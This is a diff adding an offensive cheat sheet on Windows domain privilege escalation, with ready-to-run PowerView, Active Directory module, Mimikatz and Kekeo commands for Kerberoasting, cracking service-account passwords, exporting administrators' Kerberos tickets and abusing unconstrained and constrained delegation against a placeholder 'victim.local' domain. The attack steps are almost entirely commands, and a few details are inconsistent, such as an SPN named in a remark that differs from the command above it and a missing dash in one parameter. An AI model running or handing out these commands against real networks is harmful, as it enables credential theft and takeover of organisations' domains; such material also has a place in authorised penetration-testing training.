@@ -1,0 +1,123 @@
+DOMAIN PRIVILEGE ESCALATION
+Kerberoasting
+
+Find Service accounts with Powerview
+
+Get-NetUser -SPN
+
+Find Service Accounts with ActiveDirectory Module
+
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} Properties ServicePrincipalName
+
+Requesting Tickets
+
+Request a ticket 
+
+Add-Type -AssemblyName System.IdentityModel 
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc/pcidata.dude.victim.local:SQLEXPRESS" 
+
+ (the MSSQLSvc/opsfile.offensiveps.powershell.local parameter above is the service principle name)
+
+Request Tickets using Powerview
+
+Request-SPNTicket
+
+Export all tickets using Mimikatz 
+
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+Crack the Service account password 
+
+python.exe .\tgsrepcrack.py .\passwords.txt '.\240a10000-l abuser@MSSQLSvc~pcidata.dude.victim.local~SQLEXPRESSVICTIM.COM.kirbi'
+
+Or you can just kerberoast that shit and run it through hashcat
+
+
+Unconstrained Delegation
+
+Discover domain computers which have unconstrainewd delegation enabled using powerview
+
+Get-NetComputer -Unconstrained
+
+Discover domain computers which have unconstrainewd delegation enabled using Active Directory Module
+
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADUser -Filter {TrustedForDelegation -eq $True}
+
+How to abuse Unconstrained Delegation
+
+1. We Need to compromise the server where Unconstrained Delegation is enabled and wait for or trick a high privilege user to connect to the box. 
+
+2. Once such a user is connected, we can export all the tickets, including the TGT of that user, using the following command.
+
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+3. Now we can reuse the ticket AKA delegate the fuck out of that admin token
+
+Invoke-Mimikatz -Command '"kerberos::ptt C:\tickets\admin.kirbi"'
+
+Enumerate Users with Constrained Delegation Enabled
+
+Using PowerView(dev branch)
+
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+Using ActiveDirectory Module
+
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+
+
+Abusing Constrained Delegation
+
+1. We need to get cleartext password or NTLM hash of the service account.  It can then be used with Kekeo (https://github.com/gentilkiwi/kekeo/) with the following command
+
+.\asktgt.exe /user:termadmin /domain:us.funcorp.local /key:<ntlm hash> /ticket:C:\admin_ticket.kirbi
+
+
+2. Now, using s4u from Kekeo, request a TGS with the following command
+
+.\s4u.exe /tgt:C:\admin_ticket.kirbi /user:user123@victim.local /service:cifs/pcidata.dude.victim.local
+
+
+3. Now we can use the TGS with the following
+
+Invoke-Mimikatz -Command '"kerberos::ptt cifs.pcidata.dude.victim.local.kirbi"'
+
+Remember that delegation is not restricted by SPN, so it is possible to create alternate tickets!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
